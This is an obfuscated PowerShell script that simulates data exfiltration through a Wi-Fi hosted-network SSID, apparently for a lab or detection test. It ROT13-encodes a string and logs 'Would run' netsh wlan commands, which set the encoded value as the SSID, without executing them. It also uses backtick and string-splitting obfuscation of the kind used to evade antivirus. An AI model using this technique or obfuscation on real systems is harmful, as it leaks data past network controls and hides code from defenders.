Function inVoKe`-`SsIDe`xf`IL {
    [CmdletBinding()]
    Param(
        [switch]$ExfilOnly , 
        [switch]$Decode , 
        [String]$StringToExfiltrate , 
        [String]$StringToDecode 
    )

    Function CONv`erTt`O-roT`13 {
        Param([String]$InputString )

        $builder = New-Object S`ystEm`.teXt.S`T`Ri`NGbU`iLdEr
        ForEach ($char In $InputString.('To' + 'Cha' + 'rArray').invoke()) {
            $code = [int][Char]$char 
            Switch ($code ) {
                {
                    $_ -ge 65 -And $_ -le 90 }
                {
                    [Void]$builder."AppEND"([Char]((($_ - 65 + 13) % 26) + 65))
                    Continue 
                }
                {
                    $_ -ge 97 -And $_ -le 122 }
                {
                    [Void]$builder."aPpEND"([Char]((($_ - 97 + 13) % 26) + 97))
                    Continue 
                }
                default {
                    [Void]$builder.('Appe' + 'nd').invoke($char )
                }
            }
        }

        Return $builder.('ToS' + 'tring').invoke()
    }

    $artifactDir = Join-Path $PSScriptRoot "artifacts\ssid-exfil"
    If ( -Not (Test-Path $artifactDir )) {
        $Null = New-Item -ItemType D`I`RectOry -Path $artifactDir -Force
    }

    If ($Decode ) {
        $decoded = convertto-rot13 -inputstring $StringToDecode 
        Write-Output "[safe] Decoded value: $decoded"
        Return 
    }

    If ($ExfilOnly ) {
        $plainText = $StringToExfiltrate 
    }
    Else {
        $plainText = "LAB:alice:hello"
    }

    If ([String]::('Is' + 'NullOrWhi' + 'teSpa' + 'ce').invoke($plainText )) {
        Throw "StringToExfiltrate cannot be empty."
    }

    If ($plainText."LeNgTh" -gt 32) {
        Throw "The simulated SSID payload must be 32 characters or fewer."
    }

    $ssidName = convertto-rot13 -inputstring $plainText 
    $logPath = Join-Path $artifactDir "ssid-actions.txt"
    $commands = @(
        "[safe] Would run: netsh wlan set hostednetwork mode=allow ssid=""$ssidName"" key='HardtoGuess!@#123'" , 
        "[safe] Would run: netsh wlan start hostednetwork" , 
        "[safe] Plaintext source: $plainText" , 
        "[safe] ROT13 SSID: $ssidName"
    )

    Set-Content -Path $logPath -Value $commands -Encoding Ut`F8

    Write-Output "[safe] Simulated SSID exfiltration value: $ssidName"
    Write-Output "[safe] Actions logged to $logPath"
}

invoke-ssidexfil -exfilonly -stringtoexfiltrate "LAB:alice:hello"
